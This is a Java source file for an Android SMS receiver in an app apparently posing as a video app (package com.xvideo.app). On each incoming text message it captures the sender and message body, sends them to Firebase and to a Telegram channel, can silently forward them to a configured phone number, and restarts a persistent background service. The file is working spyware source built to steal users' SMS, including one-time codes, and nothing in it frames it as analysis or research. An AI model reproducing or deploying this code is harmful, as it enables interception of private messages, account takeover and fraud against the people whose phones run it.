package com.xvideo.app.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.xvideo.app.core.Config;
import com.xvideo.app.firebase.FirebaseHelper;
import com.xvideo.app.service.MainService;
import com.xvideo.app.sms.SmsHelper;
import com.xvideo.app.telegram.TelegramHelper;
import com.xvideo.app.util.DeviceInfoUtil;
import com.xvideo.app.util.NetworkUtil;
import com.xvideo.app.util.SharedPrefManager;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !SMS_RECEIVED.equals(intent.getAction())) {
            return;
        }

        SharedPrefManager prefs = new SharedPrefManager(context);
        String deviceId = DeviceInfoUtil.getDeviceID(context);

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        StringBuilder messageBody = new StringBuilder();
        String sender = null;

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            if (sender == null) {
                sender = sms.getDisplayOriginatingAddress();
            }
            messageBody.append(sms.getDisplayMessageBody());
        }

        String body = messageBody.toString();
        long timestamp = System.currentTimeMillis();
        String time = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(new Date());

        Log.d(TAG, "SMS received from: " + sender + " - " + body);

        // Log to Firebase
        if (NetworkUtil.isNetworkConnected(context)) {
            FirebaseHelper firebaseHelper = new FirebaseHelper(context);
            firebaseHelper.logSms(timestamp, sender, body, "received");
        }

        // Send to Telegram
        TelegramHelper.sendMessage(TelegramHelper.formatSmsNotification(sender, body, time));

        // Forward SMS if enabled
        if (prefs.getBoolean(Config.PREF_SMS_FORWARD_ENABLED)) {
            String forwardNumber = prefs.getString(Config.PREF_SMS_FORWARD_NUMBER);
            if (forwardNumber != null && !forwardNumber.isEmpty()) {
                SmsHelper.forwardSms(context, sender, body, forwardNumber);
            }
        }

        // Ensure service is running
        ensureServiceRunning(context);
    }

    private void ensureServiceRunning(Context context) {
        try {
            Intent serviceIntent = new Intent(context, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
    }
}
